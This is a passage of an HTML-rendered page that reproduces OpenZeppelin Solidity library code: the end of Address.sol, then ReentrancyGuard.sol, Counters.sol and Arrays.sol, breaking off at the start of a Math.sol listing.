<span class="built_in">string</span> memory errorMessage</span></span><br><span class="line"><span class="params">    )</span> internal <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        require(address(this).balance &gt;= value, <span class="string">&quot;Address: insufficient balance for call&quot;</span>);</span><br><span class="line">        (<span class="type">bool</span> success, bytes memory returndata) = target.call&#123;value: value&#125;(data);</span><br><span class="line">        <span class="keyword">return</span> verifyCallResultFromTarget(target, success, returndata, errorMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Same as &#123;xref-Address-functionCall-address-bytes-&#125;[`functionCall`],</span></span><br><span class="line"><span class="comment">     * but performing a static call.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v3.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">functionStaticCall</span><span class="params">(address target, bytes memory data)</span> internal view <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> functionStaticCall(target, data, <span class="string">&quot;Address: low-level static call failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    function <span class="title function_">functionStaticCall</span><span class="params">(</span></span><br><span class="line"><span class="params">        address target,</span></span><br><span class="line"><span class="params">        bytes memory data,</span></span><br><span class="line"><span class="params">        <span class="built_in">string</span> memory errorMessage</span></span><br><span class="line"><span class="params">    )</span> internal view <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        (<span class="type">bool</span> success, bytes memory returndata) = target.staticcall(data);</span><br><span class="line">        <span class="keyword">return</span> verifyCallResultFromTarget(target, success, returndata, errorMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    function <span class="title function_">functionDelegateCall</span><span class="params">(address target, bytes memory data)</span> internal <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> functionDelegateCall(target, data, <span class="string">&quot;Address: low-level delegate call failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Same as &#123;xref-Address-functionCall-address-bytes-string-&#125;[`functionCall`],</span></span><br><span class="line"><span class="comment">     * but performing a delegate call.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v3.4._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">functionDelegateCall</span><span class="params">(</span></span><br><span class="line"><span class="params">        address target,</span></span><br><span class="line"><span class="params">        bytes memory data,</span></span><br><span class="line"><span class="params">        <span class="built_in">string</span> memory errorMessage</span></span><br><span class="line"><span class="params">    )</span> internal <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        (<span class="type">bool</span> success, bytes memory returndata) = target.delegatecall(data);</span><br><span class="line">        <span class="keyword">return</span> verifyCallResultFromTarget(target, success, returndata, errorMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling</span></span><br><span class="line"><span class="comment">     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.8._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">verifyCallResultFromTarget</span><span class="params">(</span></span><br><span class="line"><span class="params">        address target,</span></span><br><span class="line"><span class="params">        <span class="type">bool</span> success,</span></span><br><span class="line"><span class="params">        bytes memory returndata,</span></span><br><span class="line"><span class="params">        <span class="built_in">string</span> memory errorMessage</span></span><br><span class="line"><span class="params">    )</span> internal view <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (success) &#123;</span><br><span class="line">            <span class="keyword">if</span> (returndata.length == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// only check isContract if the call was successful and the return data is empty</span></span><br><span class="line">                <span class="comment">// otherwise we already know that it was a contract</span></span><br><span class="line">                require(isContract(target), <span class="string">&quot;Address: call to non-contract&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> returndata;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            _revert(returndata, errorMessage);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Tool to verify that a low level call was successful, and revert if it wasn&#x27;t, either by bubbling the</span></span><br><span class="line"><span class="comment">     * revert reason or using the provided one.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">verifyCallResult</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">bool</span> success,</span></span><br><span class="line"><span class="params">        bytes memory returndata,</span></span><br><span class="line"><span class="params">        <span class="built_in">string</span> memory errorMessage</span></span><br><span class="line"><span class="params">    )</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (success) &#123;</span><br><span class="line">            <span class="keyword">return</span> returndata;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            _revert(returndata, errorMessage);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _revert(bytes memory returndata, <span class="built_in">string</span> memory errorMessage) private pure &#123;</span><br><span class="line">        <span class="comment">// Look for revert reason and bubble it up if present</span></span><br><span class="line">        <span class="keyword">if</span> (returndata.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// The easiest way to bubble the revert reason is using memory via assembly</span></span><br><span class="line">            <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">            assembly &#123;</span><br><span class="line">                let returndata_size := mload(returndata)</span><br><span class="line">                revert(add(<span class="number">32</span>, returndata), returndata_size)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            revert(errorMessage);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ReentrancyGuard-sol"><a href="#ReentrancyGuard-sol" class="headerlink" title="ReentrancyGuard.sol"></a>ReentrancyGuard.sol</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.8.0) (security/ReentrancyGuard.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">abstract contract ReentrancyGuard &#123;</span><br><span class="line">    uint256 private constant _NOT_ENTERED = <span class="number">1</span>;</span><br><span class="line">    uint256 private constant _ENTERED = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    uint256 private _status;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _status = _NOT_ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    modifier <span class="title function_">nonReentrant</span><span class="params">()</span> &#123;</span><br><span class="line">        _nonReentrantBefore();</span><br><span class="line">        _;</span><br><span class="line">        _nonReentrantAfter();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _nonReentrantBefore() private &#123;</span><br><span class="line">        <span class="comment">// On the first call to nonReentrant, _status will be _NOT_ENTERED</span></span><br><span class="line">        require(_status != _ENTERED, <span class="string">&quot;ReentrancyGuard: reentrant call&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Any calls to nonReentrant after this point will fail</span></span><br><span class="line">        _status = _ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _nonReentrantAfter() private &#123;</span><br><span class="line">        <span class="comment">// By storing the original value once again, a refund is triggered (see</span></span><br><span class="line">        <span class="comment">// https://eips.ethereum.org/EIPS/eip-2200)</span></span><br><span class="line">        _status = _NOT_ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    function _reentrancyGuardEntered() internal view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> _status == _ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Counters-sol"><a href="#Counters-sol" class="headerlink" title="Counters.sol"></a>Counters.sol</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts v4.4.1 (utils/Counters.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @title Counters</span></span><br><span class="line"><span class="comment"> * @author Matt Condon (@shrugs)</span></span><br><span class="line"><span class="comment"> * @dev Provides counters that can only be incremented, decremented or reset. This can be used e.g. to track the number</span></span><br><span class="line"><span class="comment"> * of elements in a mapping, issuing ERC721 ids, or counting request ids.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Include with `using Counters for Counters.Counter;`</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">library Counters &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Counter</span> &#123;</span></span><br><span class="line">        <span class="comment">// This variable should never be directly accessed by users of the library: interactions must be restricted to</span></span><br><span class="line">        <span class="comment">// the library&#x27;s function. As of Solidity v0.5.2, this cannot be enforced, though there is a proposal to add</span></span><br><span class="line">        <span class="comment">// this feature: see https://github.com/ethereum/solidity/issues/4637</span></span><br><span class="line">        uint256 _value; <span class="comment">// default: 0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">current</span><span class="params">(Counter storage counter)</span> internal view <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> counter._value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">increment</span><span class="params">(Counter storage counter)</span> internal &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            counter._value += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">decrement</span><span class="params">(Counter storage counter)</span> internal &#123;</span><br><span class="line">        uint256 value = counter._value;</span><br><span class="line">        require(value &gt; <span class="number">0</span>, <span class="string">&quot;Counter: decrement overflow&quot;</span>);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            counter._value = value - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">reset</span><span class="params">(Counter storage counter)</span> internal &#123;</span><br><span class="line">        counter._value = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Arrays-sol"><a href="#Arrays-sol" class="headerlink" title="Arrays.sol"></a>Arrays.sol</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.8.0) (utils/Arrays.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;./StorageSlot.sol&quot;</span>;</span><br><span class="line">import <span class="string">&quot;./math/Math.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev Collection of functions related to array types.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">library Arrays &#123;</span><br><span class="line">    using StorageSlot <span class="keyword">for</span> bytes32;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Searches a sorted `array` and returns the first index that contains</span></span><br><span class="line"><span class="comment">     * a value greater or equal to `element`. If no such index exists (i.e. all</span></span><br><span class="line"><span class="comment">     * values in the array are strictly less than `element`), the array length is</span></span><br><span class="line"><span class="comment">     * returned. Time complexity O(log n).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * `array` is expected to be sorted in ascending order, and to contain no</span></span><br><span class="line"><span class="comment">     * repeated elements.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">findUpperBound</span><span class="params">(uint256[] storage <span class="built_in">array</span>, uint256 element)</span> internal view <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">array</span>.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 low = <span class="number">0</span>;</span><br><span class="line">        uint256 high = <span class="built_in">array</span>.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            uint256 mid = Math.average(low, high);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Note that mid will always be strictly less than high (i.e. it will be a valid array index)</span></span><br><span class="line">            <span class="comment">// because Math.average rounds down (it does integer division with truncation).</span></span><br><span class="line">            <span class="keyword">if</span> (unsafeAccess(<span class="built_in">array</span>, mid).value &gt; element) &#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// At this point `low` is the exclusive upper bound. We will return the inclusive upper bound.</span></span><br><span class="line">        <span class="keyword">if</span> (low &gt; <span class="number">0</span> &amp;&amp; unsafeAccess(<span class="built_in">array</span>, low - <span class="number">1</span>).value == element) &#123;</span><br><span class="line">            <span class="keyword">return</span> low - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> low;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Access an array in an &quot;unsafe&quot; way. Skips solidity &quot;index-out-of-range&quot; check.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * WARNING: Only use if you are certain `pos` is lower than the array length.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">unsafeAccess</span><span class="params">(address[] storage arr, uint256 pos)</span> internal pure <span class="title function_">returns</span> <span class="params">(StorageSlot.AddressSlot storage)</span> &#123;</span><br><span class="line">        bytes32 slot;</span><br><span class="line">        <span class="comment">// We use assembly to calculate the storage slot of the element at index `pos` of the dynamic array `arr`</span></span><br><span class="line">        <span class="comment">// following https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html#mappings-and-dynamic-arrays.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            mstore(<span class="number">0</span>, arr.slot)</span><br><span class="line">            slot := add(keccak256(<span class="number">0</span>, <span class="number">0x20</span>), pos)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slot.getAddressSlot();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Access an array in an &quot;unsafe&quot; way. Skips solidity &quot;index-out-of-range&quot; check.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * WARNING: Only use if you are certain `pos` is lower than the array length.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">unsafeAccess</span><span class="params">(bytes32[] storage arr, uint256 pos)</span> internal pure <span class="title function_">returns</span> <span class="params">(StorageSlot.Bytes32Slot storage)</span> &#123;</span><br><span class="line">        bytes32 slot;</span><br><span class="line">        <span class="comment">// We use assembly to calculate the storage slot of the element at index `pos` of the dynamic array `arr`</span></span><br><span class="line">        <span class="comment">// following https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html#mappings-and-dynamic-arrays.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            mstore(<span class="number">0</span>, arr.slot)</span><br><span class="line">            slot := add(keccak256(<span class="number">0</span>, <span class="number">0x20</span>), pos)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slot.getBytes32Slot();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Access an array in an &quot;unsafe&quot; way. Skips solidity &quot;index-out-of-range&quot; check.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * WARNING: Only use if you are certain `pos` is lower than the array length.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">unsafeAccess</span><span class="params">(uint256[] storage arr, uint256 pos)</span> internal pure <span class="title function_">returns</span> <span class="params">(StorageSlot.Uint256Slot storage)</span> &#123;</span><br><span class="line">        bytes32 slot;</span><br><span class="line">        <span class="comment">// We use assembly to calculate the storage slot of the element at index `pos` of the dynamic array `arr`</span></span><br><span class="line">        <span class="comment">// following https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html#mappings-and-dynamic-arrays.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            mstore(<span class="number">0</span>, arr.slot)</span><br><span class="line">            slot := add(keccak256(<span class="number">0</span>, <span class="number">0x20</span>), pos)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slot.getUint256Slot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Math-sol"><a href="#Math-sol" class="headerlink" title="Math.sol"></a>Math.sol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span 